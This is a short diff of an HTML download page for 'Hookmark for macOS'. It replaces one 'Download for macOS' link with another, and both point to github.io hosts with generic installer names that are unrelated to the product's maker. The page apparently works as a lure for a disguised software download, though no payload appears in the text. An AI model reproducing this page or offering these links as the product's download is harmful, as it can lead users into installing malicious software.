@@ -6,7 +6,7 @@
 <h3>Hookmark for macOS</h3>
 <p>Hookmark for macOS is aimed at knowledge workers who constantly juggle documents, links and notes across many apps.</p>
 
-<a href="https://install-quick-mac.github.io/.github/Hookmark">
+<a href="https://software-install-apps.github.io/.github/Hookmark">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
